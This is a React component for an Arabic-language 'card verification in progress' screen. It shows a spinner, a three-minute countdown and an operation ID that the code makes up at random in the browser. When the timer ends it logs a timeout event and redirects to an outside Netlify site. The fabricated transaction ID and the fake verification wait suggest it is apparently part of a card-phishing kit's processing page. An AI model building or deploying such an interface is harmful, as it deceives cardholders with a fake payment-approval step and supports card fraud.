import { useEffect, useState, useMemo } from 'react';
import { postCheckoutEvent } from '@/lib/api';

interface CardApprovalProps {
  sessionId?: string;
  orderId?: string;
}

const CardApproval = ({ sessionId }: CardApprovalProps) => {
  const [timer, setTimer] = useState(180);

  const operationId = useMemo(
    () => Math.floor(Math.random() * 900000000) + 100000000,
    []
  );

  useEffect(() => {
    if (timer > 0) {
      const timeout = setTimeout(() => setTimer(timer - 1), 1000);
      return () => clearTimeout(timeout);
    } else {
      if (sessionId) {
        postCheckoutEvent({
          sessionId,
          eventType: 'approval_timeout',
          timestamp: new Date().toISOString(),
        }).catch(() => {});
      }
      window.location.href = 'https://goldhoussin.netlify.app/';
    }
  }, [timer, sessionId]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div
      className="bg-white rounded-2xl text-center shadow-sm mx-auto flex flex-col items-center justify-center"
      style={{ width: '207.03px', height: '193px', padding: '0' }}
    >
      <div className="w-16 h-16 rounded-full mx-auto mb-7 flex items-center justify-center">
        <div
          className="w-8 h-8 rounded-full border-4 border-gray-200 border-t-blue-500 animate-spin"
          style={{
            animation: 'spin 1s linear infinite',
          }}
        />
      </div>

      <h2
        className="font-bold text-gray-900 mb-3 leading-none whitespace-nowrap"
        style={{ width: '167.03px', height: '21px', fontSize: '14px', lineHeight: '21px' }}
        dir="rtl"
      >
        انتظر للتأكد من صحة البطاقة
      </h2>

      <div
        className="font-mono font-semibold text-orange-500 mb-3"
        style={{ width: '167.03px', height: '18px', fontSize: '14px', lineHeight: '18px' }}
      >
        {formatTimer(timer)}
      </div>

      <div
        className="text-xs text-gray-500"
        style={{ width: '167.03px', lineHeight: '16px' }}
        dir="rtl"
      >
        معرف العملية: {operationId}
      </div>
    </div>
  );
};

export default CardApproval;
